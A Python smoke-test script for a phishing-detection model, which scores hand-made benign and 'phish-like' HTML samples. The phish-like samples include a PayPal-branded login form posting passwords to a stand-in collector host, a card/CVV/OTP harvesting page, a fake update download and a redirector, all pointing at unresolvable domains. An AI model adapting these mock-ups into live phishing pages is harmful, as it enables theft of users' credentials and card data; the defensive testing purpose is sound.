"""
Offline smoke test for the content model: feeds hand-made sample pages straight into content_features + the model.
Nothing is downloaded and nothing is opened in a browser. The sample "phishing-like" pages are inert mock-ups
(text only, no logos, forms point at reserved .test / .invalid domains that cannot resolve).

Run from AIDev/:
    python -m aidev.tools.test_samples                                   # built-in samples
    python -m aidev.tools.test_samples --file page.html --url https://some.site/login   # your own saved HTML

This checks that the pipeline WORKS (extraction -> model -> reasons). It does not measure accuracy: for that use the
Test set tab of verify_server.py with real URLs.
"""
from __future__ import annotations

import argparse
import sys

from aidev.detection import content_features as cf
from aidev.detection import predict_content as pc

FILLER = ("We publish guides, news and documentation for our community. Read the latest articles, browse the archive, "
          "subscribe to the newsletter and contact the team if you have questions. ") * 6
NAV = "".join(f'<li><a href="/p{i}">Page {i}</a></li>' for i in range(14))
FOOT = "<footer>&copy; 2026 Example Co. All rights reserved. <a href='/privacy'>Privacy</a> <a href='/terms'>Terms</a></footer>"


def page(title, body, head="", lang=True):
    return (f'<!doctype html><html{" lang=en" if lang else ""}><head><title>{title}</title>'
            f'<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">{head}</head>'
            f"<body><ul>{NAV}</ul>{body}{FOOT}</body></html>")


SAMPLES = [
    ("benign: blog / article", "https://www.greenfieldnews.example/", "benign",
     page("Greenfield News - Home", f"<h1>Greenfield News</h1><p>{FILLER}</p><img src='/a.jpg'><img src='/b.jpg'>",
          "<script src='/app.js'></script>")),
    ("benign: documentation page", "https://docs.toolkit.example/guide", "benign",
     page("Toolkit documentation", f"<h1>Guide</h1><p>{FILLER}</p><pre>pip install toolkit</pre>")),
    ("benign: real-style login (same domain)", "https://accounts.shopfront.example/login", "benign",
     page("Sign in - Shopfront",
          f"<h1>Sign in</h1><p>{FILLER}</p><form action='/session' method='post'><input name='email' type='email'>"
          "<input name='password' type='password'><button>Sign in</button></form>")),
    ("phish-like: brand login posting to another site", "https://secure-account-check.example-host.test/signin", "phish-like",
     '<html><head><title>PayPal - Log in to your account</title></head><body>'
     "<h2>Verify your account</h2><p>Unusual activity detected. Confirm your password to avoid suspension.</p>"
     "<form action='https://collector.badsite.invalid/post.php' method='post'><input name='email'>"
     "<input type='password' name='pass'><input type='hidden' name='a' value='1'><input type='hidden' name='b' value='2'>"
     "<input type='submit' value='Log in'></form>"
     "<iframe src='https://track.badsite.invalid/x' width='0' height='0'></iframe>"
     "<script>eval(unescape('%61%6c%65%72%74'));document.write(atob('PGI+'));</script>"
     "<script>document.oncontextmenu=function(){return false}</script>"
     "<img src='https://cdn.brand-assets.invalid/logo.png'><script src='https://cdn.brand-assets.invalid/x.js'></script></body></html>"),
    ("phish-like: card / OTP page, form goes nowhere", "https://bank-update.example-host.test/verify", "phish-like",
     '<html><head><title>Secure bank verification</title></head><body><h2>Verify your card</h2>'
     "<p>Your account is limited. Enter your card number, CVV and the OTP we sent you to restore access.</p>"
     "<form action='' method='post'><input name='card_number' placeholder='card number'><input name='cvv'>"
     "<input name='otp' placeholder='OTP'><input name='expiry'><button>Confirm</button></form></body></html>"),
    ("phish-like: fake plugin / update download", "https://update-required.example-host.test/", "phish-like",
     '<html><head><title>Update required</title></head><body><h1>Update required</h1>'
     "<p>Install now: your browser is out of date. Install extension to continue.</p>"
     "<a href='/setup.exe'>Download</a><a href='#'>Help</a></body></html>"),
    ("phish-like: thin redirector page", "https://go.example-host.test/r", "phish-like",
     '<html><head><meta http-equiv="refresh" content="0;url=https://elsewhere.invalid/"></head><body>'
     "<script>window.location.href='https://elsewhere.invalid/login';</script></body></html>"),
]


def score(bundle, html, url):
    f = cf.extract(html, url)
    p = float(bundle["model"].predict_proba([[f[n] for n in bundle["feature_names"]]])[0][1])
    return p, pc.signals(f)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--file", help="a saved HTML file to score instead of the built-in samples")
    ap.add_argument("--url", default="https://unknown.example/", help="the address that page came from")
    a = ap.parse_args()
    b = pc._load()
    if b is None:
        print("Content model not loaded: check model_content.joblib exists and content_features.py is version 2.")
        return 1
    print(f"model {b.get('version')}  features {len(b['feature_names'])}  eval {b.get('eval_mode')}\n")
    if a.file:
        html = open(a.file, encoding="utf-8", errors="replace").read()
        p, sig = score(b, html, a.url)
        print(f"{p:6.1%}  {a.url}")
        for s in sig:
            print("        -", s)
        return 0
    ok = 0
    for name, url, kind, html in SAMPLES:
        p, sig = score(b, html, url)
        flagged = p >= 0.5
        good = flagged == (kind == "phish-like")
        ok += good
        print(f"{p:6.1%}  {'OK ' if good else 'MISS'}  {name}")
        for s in sig:
            print("               -", s)
    print(f"\n{ok}/{len(SAMPLES)} samples on the expected side of 0.5 (threshold used for this quick check).")
    print("A miss on a hand-made sample is not a bug by itself: the model has AUC ~0.76 on real pages.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
